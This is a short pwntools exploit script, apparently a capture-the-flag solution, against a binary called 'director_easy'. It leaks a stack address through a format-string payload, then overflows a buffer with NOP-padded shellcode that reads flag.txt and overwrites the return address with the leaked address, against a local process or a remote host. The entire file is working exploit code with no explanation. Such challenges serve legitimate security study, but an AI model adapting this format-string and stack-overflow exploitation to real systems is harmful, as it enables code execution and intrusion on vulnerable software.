#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./director_easy', checksec=False)
libc = elf.libc

def setup():
    if args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process(elf.path)
        context.terminal = ['tmux', 'splitw', '-h']
        if args.GDB:
            gdb.attach(p, gdbscript='''
            ''')
    
    return p

p = setup()
pause()

shellcode = asm(shellcraft.cat('flag.txt'))
payload = b'{%1$p}'
p.sendlineafter(b'Input:', payload)
p.recvuntil(b'{')
stack_addr = int(p.recvuntil(b'}')[:-1], 16) + 0x230 -0x80
success(f'Libc stack address: {hex(stack_addr)}')

shellcode = shellcode.ljust(280, b'\x90') + p64(stack_addr)
p.sendlineafter(b'Input:', shellcode)

p.interactive()